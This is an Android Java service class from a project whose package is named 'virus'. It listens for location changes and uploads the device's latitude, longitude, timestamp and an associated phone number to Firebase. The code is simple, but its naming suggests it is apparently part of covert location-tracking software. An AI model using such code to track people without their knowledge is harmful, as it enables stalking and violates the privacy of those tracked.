package com.example.phanv.virus.Service;

import android.app.Service;
import android.content.Intent;
import android.location.Location;
import android.location.LocationListener;
import android.os.Bundle;
import android.os.IBinder;
import android.support.annotation.Nullable;

import com.example.phanv.virus.Control.FireBaseControl;
import com.example.phanv.virus.Control.ProcessData;
import com.example.phanv.virus.Model.GPSTracker;

/**
 * Created by phanv on 26-Oct-17.
 */

public class PositionService extends Service implements LocationListener {
    FireBaseControl fireBase =new FireBaseControl();
    String phone="";
    GPSTracker gpsTracker;
    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onCreate() {
        super.onCreate();
         gpsTracker = new GPSTracker(this);
    }
    @Override
    public void onLocationChanged(Location location) {
        ProcessData pr =new ProcessData();
        if (gpsTracker.canGetLocation()) {
            String lat = gpsTracker.getLatitude() + "";
            String lng = gpsTracker.getLongitude() + "";
            fireBase.upPosition(phone,pr.getCurrentTimeByFormat("dd/MM/yyyy HH:mm:ss"), lat, lng);
        } else {

        }
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        phone = intent.getStringExtra("phone");
        return super.onStartCommand(intent, flags, startId);
    }
    @Override
    public void onStatusChanged(String provider, int status, Bundle extras) {

    }

    @Override
    public void onProviderEnabled(String provider) {

    }

    @Override
    public void onProviderDisabled(String provider) {

    }
}
